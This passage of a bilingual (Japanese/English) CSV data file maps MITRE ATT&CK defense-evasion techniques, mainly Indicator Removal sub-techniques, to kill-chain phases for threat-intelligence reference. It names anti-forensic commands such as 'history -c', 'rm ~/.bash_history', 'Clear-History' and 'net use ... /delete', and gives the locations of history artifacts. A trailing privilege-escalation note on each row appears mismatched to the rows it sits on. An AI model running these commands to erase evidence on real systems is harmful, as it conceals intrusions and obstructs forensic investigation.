防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.009,永続化の痕跡消去,Clear Persistence,"攻撃者は、活動の証拠を削除するために、ホストシステム上で以前に確立された永続性に関連するアーティファクトをクリアする可能性があります。これには、サービスの削除、実行可能ファイルの削除、[レジストリの変更](https://attack.mitre.org/techniques/T1112)、[Plistファイルの変更](https://attack.mitre.org/techniques/T1647)、または防御側が永続的な存在の証拠を収集するのを防ぐためのその他のクリーンアップ方法など、さまざまなアクションが含まれる場合があります。(引用: Cylance Dust Storm) 攻撃者はまた、永続性を維持するために以前に作成されたアカウントを削除する可能性もあります（つまり、[アカウントの作成](https://attack.mitre.org/techniques/T1136)）。(引用: Talos - Cisco Attack 2022)

場合によっては、マルウェアの新しいインスタンスのエラーを防ぐために、攻撃者の永続性が実行されると、永続性のアーティファクトも削除されることがあります。(引用: NCC Group Team9 June 2020)","Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)

In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.003,コマンド履歴の消去,Clear Command History,"システムログのクリアに加えて、敵対者は侵入中に行った行動を隠蔽するために、侵害されたアカウントのコマンド履歴をクリアするかもしれない。様々なコマンドインタプリタは、ユーザーが端末に入力したコマンドを追跡し、ユーザーが何をしたかを遡れるようにする。

LinuxおよびmacOSでは、これらのコマンド履歴にはいくつかの異なる方法でアクセスできます。ログイン中は、このコマンド履歴は環境変数<code>HISTFILE</code>が指すファイルに記録されます。ユーザーがシステムからログオフすると、この情報はユーザーのホームディレクトリにある<code>~/.bash_history</code>というファイルに書き込まれます。これの利点は、ユーザーが異なるセッションで使用した以前のコマンドに戻ることができることです。攻撃者は、履歴を手動でクリアしたり（<code>history -c</code>）、bash履歴ファイル（<code>rm ~/.bash_history</code>）を削除したりして、これらのログからコマンドを削除する可能性があります。

敵対者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用して、コマンド履歴データ（<code>clear logging</code>および/または<code>clear history</code>）をクリアする可能性があります。(引用: US-CERT-TA18-106A) ESXiサーバーでは、コマンド履歴は<code>/var/log/shell.log</code>ファイルから手動で削除される場合があります。(引用: Broadcom ESXi Shell Audit)

Windowsホストでは、PowerShellには2つの異なるコマンド履歴プロバイダーがあります。組み込みの履歴と、<code>PSReadLine</code>モジュールによって管理されるコマンド履歴です。組み込みの履歴は、現在のセッションで使用されたコマンドのみを追跡します。このコマンド履歴は他のセッションでは使用できず、セッションが終了すると削除されます。

<code>PSReadLine</code>コマンド履歴は、すべてのPowerShellセッションで使用されたコマンドを追跡し、ファイル（デフォルトでは<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>）に書き込みます。この履歴ファイルはすべてのセッションで使用でき、セッションが終了してもファイルは削除されないため、過去のすべての履歴が含まれています。(引用: Microsoft PowerShell Command History)

攻撃者はPowerShellコマンド<code>Clear-History</code>を実行して、現在のPowerShellセッションからコマンド履歴全体をフラッシュする可能性があります。ただし、これにより<code>ConsoleHost_history.txt</code>ファイルが削除/フラッシュされることはありません。攻撃者はまた、<code>ConsoleHost_history.txt</code>ファイルを削除したり、その内容を編集したりして、実行したPowerShellコマンドを隠す可能性があります。(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics)","In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file.(Citation: Broadcom ESXi Shell Audit)

On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.

The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)

Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.010,マルウェアの再配置,Relocate Malware,"ペイロードが配信されると、攻撃者は、その存在の証拠を削除したり、防御を回避したりするために、被害者システム上で同じマルウェアのコピーを複製する可能性があります。マルウェアペイロードを新しい場所にコピーすることは、古いアーティファクトをクリーンアップするための[ファイル削除](https://attack.mitre.org/techniques/T1070/004)と組み合わせることもできます。

マルウェアの再配置は、防御を回避することを目的とした多くのアクションの一部である可能性があります。例えば、攻撃者は、ローカル環境によりよく溶け込むためにペイロードをコピーして名前を変更する可能性があります（つまり、[正当なリソース名または場所との一致](https://attack.mitre.org/techniques/T1036/005)）。(引用: DFIR Report Trickbot June 2023) ペイロードはまた、[ファイル/パスの除外](https://attack.mitre.org/techniques/T1564/012)や、[永続性](https://attack.mitre.org/tactics/TA0003)の確立に関連する特定の場所をターゲットにするために再配置される場合もあります。(引用: Latrodectus APR 2024)

悪意のあるペイロードを再配置すると、特に、アラートを生成したり、防御側からの注意を引いたりした可能性のある以前のイベント（[ユーザー実行](https://attack.mitre.org/techniques/T1204)や[フィッシング](https://attack.mitre.org/techniques/T1566)など）からこれらのペイロードを分離するために、防御側の分析が妨げられる可能性もあります。","Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts.

Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: DFIR Report Trickbot June 2023) Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation: Latrodectus APR 2024)

Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204) and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated alerts or otherwise drawn attention from defenders.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.007,ネットワーク接続履歴と構成の消去,Clear Network Connection History and Configurations,"攻撃者は、作戦の痕跡を消去するために、悪意のあるネットワーク接続の証拠を消去または削除する可能性があります。構成設定や、[リモートサービス](https://attack.mitre.org/techniques/T1021)や[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など、ネットワーク接続を必要とする動作からシステム上および/またはアプリケーションログに接続履歴を強調するさまざまなアーティファクトが作成される場合があります。防御側はこれらのアーティファクトを使用して、攻撃者によって作成されたネットワーク接続を監視または分析する場合があります。

ネットワーク接続履歴は、さまざまな場所に保存されている可能性があります。例えば、RDP接続履歴は、Windowsレジストリ値の次の場所に保存されている場合があります。(引用: Microsoft RDP Removal):

* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>
* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>

Windowsはまた、<code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code>や`C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\`などのファイルに最近のRDP接続に関する情報を保存する場合もあります。(引用: Moran RDPieces) 同様に、macOSおよびLinuxホストは、システムログ（`/Library/Logs`や`/var/log/`に保存されているものなど）に接続履歴を強調する情報を保存する場合があります。(引用: Apple Culprit Access)(引用: FreeDesktop Journal)(引用: Apple Unified Log Analysis Remote Login and Screen Sharing)

悪意のあるネットワーク接続には、サードパーティアプリケーションやネットワーク構成設定の変更（[システムファイアウォールの無効化または変更](https://attack.mitre.org/techniques/T1562/004)など）や、[プロキシ](https://attack.mitre.org/techniques/T1090)を有効にするための改ざんが必要になる場合もあります。攻撃者は、インジケータを隠蔽したり、防御側の分析を妨害したりするために、このデータを削除または変更する可能性があります。","Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.

Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):

* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>
* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>

Windows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.005,ネットワーク共有接続の削除,Network Share Connection Removal,攻撃者は、作戦の痕跡を消去するために、不要になった共有接続を削除する可能性があります。Windows共有ドライブおよび[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)接続は、不要になったときに削除できます。[Net](https://attack.mitre.org/software/S0039)は、<code>net use \\\\system\\share /delete</code>コマンドでネットワーク共有接続を削除するために使用できるユーティリティの一例です。(引用: Technet Net Use),Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use),5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1647,Plistファイル変更,Plist File Modification,"攻撃者は、プロパティリストファイル（plistファイル）を変更して、他の悪意のあるアクティビティを有効にし、同時にシステム防御を回避およびバイパスする可能性があります。macOSアプリケーションは、<code>info.plist</code>ファイルなどのplistファイルを使用して、オペレーティングシステムが実行時にアプリケーションを処理する方法を通知するプロパティと構成設定を格納します。Plistファイルは、AppleのCore Foundation DTDに基づいてXMLでフォーマットされたキーと値のペアの構造化メタデータです。Plistファイルは、テキスト形式またはバイナリ形式で保存できます。(引用: fileinfo plist file description)

攻撃者はplistファイル内のキーと値のペアを変更して、アプリケーションの実行を隠したり（つまり[隠しウィンドウ](https://attack.mitre.org/techniques/T1564/003)）、永続化のために追加のコマンドを実行したり（例：[起動エージェント](https://attack.mitre.org/techniques/T1543/001)/[起動デーモン](https://attack.mitre.org/techniques/T1543/004)または[再起動されたアプリケーション](https://attack.mitre.org/techniques/T1547/007)）するなど、システムの動作に影響を与える可能性があります。

例えば、攻撃者は悪意のあるアプリケーションパスをDockに表示されるアプリを制御する<code>~/Library/Preferences/com.apple.dock.plist</code>ファイルに追加できます。攻撃者はまた、アプリケーションの<code>info.plist</code>ファイルの<code>LSUIElement</code>キーを変更して、アプリをバックグラウンドで実行することもできます。攻撃者はまた、キーと値のペアを挿入して、[ダイナミックリンカーハイジャック](https://attack.mitre.org/techniques/T1574/006)を介した永続化を可能にするために<code>LSEnvironment</code>などの環境変数を挿入することもできます。(引用: wardle chp2 persistence)(引用: eset_osx_flashback)","Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description)

Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).

For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application’s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

